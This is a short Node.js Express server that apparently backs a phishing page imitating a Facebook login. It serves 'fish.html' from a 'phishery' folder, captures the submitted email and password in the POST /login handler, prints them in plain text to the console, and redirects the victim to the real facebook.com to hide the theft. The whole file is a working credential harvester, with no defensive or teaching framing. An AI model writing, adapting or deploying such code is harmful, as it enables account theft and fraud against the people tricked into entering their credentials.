const express = require('express');
const app = express();
const path = require('path');

// Middleware to parse URL-encoded bodies (as sent by HTML forms)
app.use(express.urlencoded({ extended: true }));

// Serve static files from the 'public' directory
app.use(express.static('phishery'));

// Optional: Explicitly define a route for '/'
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'phishery', 'fish.html'));
});

// Handle POST request for the login form
app.post('/login', (req, res) => {
    const { email, password } = req.body;
    console.log('Email:', email);
    console.log('Password:', password);
    res.redirect('https://www.facebook.com');
});

// Start the server
const PORT = 3000;
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
